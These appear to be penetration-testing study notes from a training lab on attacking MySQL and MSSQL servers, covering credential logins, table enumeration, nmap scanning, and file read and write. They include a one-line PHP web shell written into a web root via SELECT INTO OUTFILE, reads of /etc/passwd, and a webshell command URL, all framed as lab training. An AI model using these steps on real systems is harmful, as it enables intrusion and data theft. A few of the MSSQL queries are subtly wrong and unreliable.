MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). In the past, there was a vulnerability CVE-2012-2122 in MySQL 5.6.x servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the timing attack vulnerability existed in the way MySQL handled authentication attempts
# Protocol Specific Attacks
Let's imagine we gained access to a SQL Database. First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table.
## MySQL - Connecting to the SQL Server
### Linux
```
mysql -u julio -pPassword123 -h 10.129.20.13
```
SQL Syntax
```
mysql> SHOW DATABASES;
```
Select a Database
```
mysql> USE htbusers;
```
Show Tables
```
mysql> SHOW TABLES;
```
Select all Data from Table "users”
```
mysql> SELECT * FROM users;
```
### Windows
```
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
SQL Syntax
```
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```
Select a Database
```
1> USE htbusers
2> GO
```
Show Tables
```
1> SELECT table.name FROM htbusers.INFORMATION.SCHEMA.TABLES
2> GO
```
Select all Data from Table "users”
```
1> SELECT * FROM user
2> GO
```
## Dump sql credentials
For example you have db.php5 file with a database called Magic
```
mysqldump Magic -utheseus -piamkingtheseus
```

# Scanning MySQL Server
```
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
Be careful with false positives, as we know for a fact that the target MySQL server does not use an empty password for the user root, but a fixed password. We can test this with the following command:
```
mysql -u root  -h 10.129.14.128
```
Access denied
if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.
```
mysql -u root -pP4SSw0rd -h 10.129.14.128
```
The most important databases for the MySQL server are the system schema (sys) and information schema (information_schema). 
We can get usernames and passwords from the SQL database.
## Write Local Files
we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.
### MySQL - Write Local File
```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.
`secure_file_priv` may be set as follows:
1. IF empty: The variable has no effect, which is not a secure setting
2. IF set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist, the server does not create it
3. IF set to  NULL, the server disables import and export operations
```
mysql> show variables like "secure_file_priv";
```
`secure_file_priv` variable is empty (within the value in the table), which means we can read and write data using MySQL
## Read Files
by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
```
mysql> select LOAD_FILE("/etc/passwd");
```
If it is on a webserver after uploading a php webshell
```
http://10.129.196.66/backdoor.php?cmd=type C:\\Users\\Administrator\\Desktop\\flag.txt
```
# dbeaver
dbeaver is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.
## Install dbeaver
```
sudo dpkg -i dbeaver-<version>.deb
```
## Run dbeaver
```
dbeaver &
```
